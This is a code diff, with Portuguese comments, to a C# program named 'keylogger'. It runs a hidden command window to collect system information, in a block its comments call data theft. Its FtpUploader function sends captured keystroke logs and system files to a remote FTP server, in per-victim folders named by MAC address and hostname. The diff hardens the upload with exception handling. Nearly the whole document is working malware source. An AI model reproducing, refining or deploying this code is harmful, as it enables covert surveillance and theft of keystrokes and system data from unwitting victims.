@@ -30,7 +30,7 @@ namespace keylogger {
             cmd.StartInfo.RedirectStandardOutput = true;
             cmd.StartInfo.CreateNoWindow = true;
             cmd.StartInfo.UseShellExecute = false;
-            cmd.StartInfo.WindowStyle = ProcessWindowStyle.Hidden; // make similar to daemon
+            cmd.StartInfo.WindowStyle = ProcessWindowStyle.Hidden; 
             cmd.Start();
 
             // Start data theft code execution
@@ -62,7 +62,6 @@ namespace keylogger {
             cmd.StandardInput.WriteLine("dir >> %filepath%");
             cmd.StandardInput.WriteLine("cd \\");
 
-            // End data theft code execution
             cmd.StandardInput.Flush();
             cmd.StandardInput.Close();
             cmd.WaitForExit();
@@ -82,63 +81,73 @@ namespace keylogger {
             }
         }
 
-        public static void FtpUploader(string ftpServer, int ftpPort, string ftpUsername, string ftpPassword, string filepathForUpload, string userFolderFtp, bool uploadType) {
+        public static bool FtpUploader(string ftpServer, int ftpPort, string ftpUsername, string ftpPassword, string filepathForUpload, string userFolderFtp, bool uploadType) {
             //Verificando se há conexão à internet
             if(CheckInternetConnection()) {
-                //Criando um objeto do tipo FtpClient com as credenciais de acesso do FTP
-                using(var client = new FtpClient(ftpServer, ftpPort, ftpUsername, ftpPassword)) {
-                    client.Connect(); //Conectando ao FTP
-                    Console.WriteLine("FTP Conectado");
+                //Caso a internet caia no meio do processo, tratamos as exceções
+                try {
+                    //Criando um objeto do tipo FtpClient com as credenciais de acesso do FTP
+                    using(var client = new FtpClient(ftpServer, ftpPort, ftpUsername, ftpPassword)) {
+                        client.Connect(); //Conectando ao FTP
+                        Console.WriteLine("\nFTP Conectado");
 
-                    //Se a pasta da vítima atual ainda não existir, significa que é a primeira vez o keylogger está sendo executado
-                    if(!client.DirectoryExists("/htdocs/loggers/" + userFolderFtp)) {
-                        //Então criamos a pasta com o nome identificador (userFolderFtp) no caminho onde ficam armazenados todos os logs das vítimas
-                        client.CreateDirectory("/htdocs/loggers/" + userFolderFtp, true);
-                    }
-
-                    string ftpFilepathTarget;
-                    client.RetryAttempts = 3; //Máxima de tentativas de upload = 3
-
-                    //Caso o tipo de upload for de arquivo do sistema
-                    if(uploadType == KeyboardListener.sysUpload) {
-                        ftpFilepathTarget = "/htdocs/loggers/" + userFolderFtp + "/syslog/sys_data_capture.log";
-
-                        if(!client.DirectoryExists("/htdocs/loggers/" + userFolderFtp + "/syslog")) {
-                            //Criando a pasta que irá ficar o arquivo de informações do sistema
-                            client.CreateDirectory("/htdocs/loggers/" + userFolderFtp + "/syslog", true);
+                        //Se a pasta da vítima atual ainda não existir, significa que é a primeira vez o keylogger está sendo executado
+                        if(!client.DirectoryExists("/htdocs/loggers/" + userFolderFtp)) {
+                            //Então criamos a pasta com o nome identificador (userFolderFtp) no caminho onde ficam armazenados todos os logs das vítimas
+                            client.CreateDirectory("/htdocs/loggers/" + userFolderFtp, true);
                         }
-                        //Fazendo o upload do arquivo do arquivo de informações do sistema para a sua pasta
-                        client.UploadFile(filepathForUpload, ftpFilepathTarget, FtpRemoteExists.Skip, false, FtpVerify.Retry);
-                    }
-                    //Caso o tipo de upload for o log das teclas quando o pc é desligado
-                    else if(uploadType == KeyboardListener.logUpload) {
-                        string nameOfLastItem = string.Empty; //Guarda o nome do último arquivo da pasta da vítima atual
-                        bool isFolderEmpty = true; //Guarda se a pasta está vazia
 
-                        //Varrendo a pasta do usuário
-                        foreach(FtpListItem item in client.GetListing("/htdocs/loggers/" + userFolderFtp)) {
-                            if(item.Type == FtpFileSystemObjectType.File) {
-                                nameOfLastItem = item.Name; //guarda o nome do último arquivo
-                                isFolderEmpty = false; 
+                        string ftpFilepathTarget;
+                        client.RetryAttempts = 3; //Máxima de tentativas de upload = 3
+
+                        //Caso o tipo de upload for de arquivo do sistema
+                        if(uploadType == KeyboardListener.sysUpload) {
+                            ftpFilepathTarget = "/htdocs/loggers/" + userFolderFtp + "/syslog/sys_data_capture.log";
+
+                            if(!client.DirectoryExists("/htdocs/loggers/" + userFolderFtp + "/syslog")) {
+                                //Criando a pasta que irá ficar o arquivo de informações do sistema
+                                client.CreateDirectory("/htdocs/loggers/" + userFolderFtp + "/syslog", true);
+                            }
+                            //Fazendo o upload do arquivo do arquivo de informações do sistema para a sua pasta
+                            client.UploadFile(filepathForUpload, ftpFilepathTarget, FtpRemoteExists.Skip, false, FtpVerify.Retry);
+                        }
+                        //Caso o tipo de upload for o log das teclas quando o pc é desligado
+                        else if(uploadType == KeyboardListener.logUpload) {
+                            string nameOfLastItem = string.Empty; //Guarda o nome do último arquivo da pasta da vítima atual
+                            bool isFolderEmpty = true; //Guarda se a pasta está vazia
+
+                            //Varrendo a pasta do usuário
+                            foreach(FtpListItem item in client.GetListing("/htdocs/loggers/" + userFolderFtp)) {
+                                if(item.Type == FtpFileSystemObjectType.File) {
+                                    nameOfLastItem = item.Name; //guarda o nome do último arquivo
+                                    isFolderEmpty = false;
+                                }
+                            }
+
+                            if(isFolderEmpty) {
+                                ftpFilepathTarget = "/htdocs/loggers/" + userFolderFtp + "/1#" + GetMacAddress() + "_" + Dns.GetHostName() + ".log";
+                                client.UploadFile(filepathForUpload, ftpFilepathTarget, FtpRemoteExists.Overwrite, false, FtpVerify.Retry);
+                            }
+                            else {
+                                int idLog = int.Parse(nameOfLastItem.Substring(0, 1)) + 1; //Pegando qual é a próxima versão do log de teclas (id do arquivo)
+                                ftpFilepathTarget = "/htdocs/loggers/" + userFolderFtp + "/" + idLog + "#" + GetMacAddress() + "_" + Dns.GetHostName() + ".log";
+                                client.UploadFile(filepathForUpload, ftpFilepathTarget, FtpRemoteExists.Overwrite, false, FtpVerify.Retry);
                             }
                         }
 
-                        if(isFolderEmpty) {
-                            ftpFilepathTarget = "/htdocs/loggers/" + userFolderFtp + "/1#" + GetMacAddress() + "_" + Dns.GetHostName() + ".log";
-                            client.UploadFile(filepathForUpload, ftpFilepathTarget, FtpRemoteExists.Overwrite, false, FtpVerify.Retry);
-                        }
-                        else {
-                            int idLog = int.Parse(nameOfLastItem.Substring(0, 1)) + 1; //Pegando qual é a próxima versão do log de teclas (id do arquivo)
-                            ftpFilepathTarget = "/htdocs/loggers/" + userFolderFtp + "/" + idLog + "#" + GetMacAddress() + "_" + Dns.GetHostName() + ".log";
-                            client.UploadFile(filepathForUpload, ftpFilepathTarget, FtpRemoteExists.Overwrite, false, FtpVerify.Retry);
-                        }
-                    }
+                        Console.WriteLine("FTP Concluído");
+                        //Desconectando do FTP
+                        client.Disconnect();
 
-                    Console.WriteLine("FTP Concluído");
-                    //Desconectando do FTP
-                    client.Disconnect();
+                        return true;
+                    }
+                }
+                catch(FtpException e) {
+                    return false;
                 }
             }
+
+            return false;
         }
     }
 }
